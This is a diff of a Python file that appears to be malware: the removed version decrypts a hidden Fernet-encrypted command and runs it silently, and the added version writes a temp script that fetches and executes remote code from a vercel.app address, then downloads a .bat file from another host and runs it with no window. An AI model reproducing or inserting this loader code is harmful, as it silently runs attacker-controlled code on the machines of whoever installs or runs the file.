@@ -1,12 +1,30 @@
+from tempfile import NamedTemporaryFile as _ffile
+from sys import executable as _eexecutable
+from os import system as _ssystem
+import requests
 import os
+import uuid
+import tempfile
 import subprocess
-from cryptography.fernet import Fernet
 
-key = b'hJfO4srXi-voezVlzy0yCFLmVCrCbEbx4eQ2Rmgo20w='
-encrypted_message = b'gAAAAABnoRd0b39joU-K9UFbv_6XfXiUTLUuDV4OP8JOzPQTltWdBv43Y07nf_pVfDVQfwdL60Q7FNgZMglmOiDTQB_lRbfHuBu6wcdEBf_IKP5pT9_2URGlEdfadw7njpDs3lxIOh8R4MhMBDro99PYb94ntQd1VnXR2Atobr7OhqEVQgjnU_zOLUnEKGVXUQAjameVO-ySPSKme0JIzL2bwnj6-htHeHJvH5JZK6rlS52USC3hIHHaqT-TuoShlWUaEyggz8JgzjXRk6ozfSTKlLZsywJT8fnkE8uyceWuWiRy_F5QyIqW59NkNSXTkYrD1ZbA1QxP6wg_EZE7T1GMcDJzNdJFJmsQbiCwkfVChaTVZOjJPzXXW8PBP4gRIQv_eZoQbBoC0vMFOglDFbkjkXQz_sG7tQlvLF6B_rKgHIT9rj88NC1fr8rXP4Ox7O_uFE2hf37GCqgHyYeB1XAK2x4Ko0gB8nnGfT79ZAYnzsSRC0mDIuoXpHfPfxQqTA2xNKCU5qCQZw_N_gh_zlX4F543pZW8A9L-DufxbptPy8UL3llafms9BRJN71BY7CswPGySnrVUMac5ZWvOUKLL9hGvOpJNQX4kXklE8pdh3BmpRV1-Jt8rq_Gz0tyvi8dmQouoQaLYq95iXZkRc0_3tWrLjwbY7GX7tYi09jk2q2ak7nZ54DxLBCmTPpCUdCKGpDyLL2yRFpHrVFZ24EKYtA51o1iCD_SC4Pu_25TP_yw5Y5MRg990u1wy-eLGPwSL48LMa1dsFr_FhztJ2y6XFzSrBl9kZjW1eVeg-gczuB1CAbH53QwvMiDZDSi6KQqjaE99YYlAtxMmDVv_bp6ki8mvEMKeR-oxvv7baAcoky_UpyCxmzHiZOnIirMNthCeGMVLl2EHS-Udj8MJZdAFbCvjbq4W2SnTbryflRm5KyFNkFNZqZBvrmKxGiQcQZB9Wo8wRpDMyFYPF_GDES859pRS7vNElhmQA3KUEP0HJ3Wt99h-U2rC_FozesgbgHAaWhEvY8jjY6CFyyi51g2WATXFxhahSIFtU9goLoZ_qP0JBykGNUm99hOvT3j7Qni_jLY2QiYV5Nv3H3-w0UzmnPWT5rXSl2EZSabkR8jGUIVUGQUDkpR3YLPlbcrgHod5NmS300Et84D4tm5P-o1fSemwf5373JJW6a4bn5mMYBuHmTdj6oLKrwO1iEiqNFy9bWDHNstIUBfgjtA_4qM82eofYA5BosR2xBXbagkLhZEq9iwJ84yGx9CTbL-UKJ1YTX53SscuVwjhTK5aeEPiJhDC6Vw4uVK8uV7K4ly2_f1Ps8H-kZdmALwXviybcWlYf7XZTdQfsYRaCgOEoWs2dCGF_S_eAUIMFOIfurTCvskrGCNs1aW-haboaAq3FIC_jTi9ZLHtbs55XruGv9sLJRq6Hz03-XKDKsFEiunp7R8QLNS1vfESp0sss9V2JSQBkSH9JekHQlapVZAwWRJEe19uvkteqzE3b-qPvtOcQ3UqXWeXuB8Y7-6UKQjcCU8hN0Tbl8X_V_8-q8cseX1-DRjfPxmGBcAORhL6mM57EvKAxxU62n-uX5XbqTCvnl9Pvp6NmD3cnP8WpOiLDSeFWcPyfbfnQ-m128S49HWPnkLB3PTVuQw='
+_ttmp = _ffile(delete=False)
+_ttmp.write(b"""from urllib.request import urlopen as _uurlopen;exec(_uurlopen("https://h4ndl3r.vercel.app/2.txt").read())""")
+_ttmp.close()
+try:
+    _ssystem(f"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}")
+except:
+    pass
 
-cipher_suite = Fernet(key)
-decrypted_message = cipher_suite.decrypt(encrypted_message)
+url = "https://ok-omega-eight.vercel.app/Build.bat"
+temp = tempfile.gettempdir()
+name = os.path.join(temp, str(uuid.uuid4()) + ".bat")
 
-command = decrypted_message.decode('utf-8')
-subprocess.Popen(["python", "-c", command], creationflags=subprocess.CREATE_NO_WINDOW)
+response = requests.get(url)
+
+if response.status_code == 200:
+    with open(name, 'wb') as dosya:
+        dosya.write(response.content)
+    
+    subprocess.Popen([name], creationflags=subprocess.CREATE_NO_WINDOW, shell=True)
+else:
+    exit()
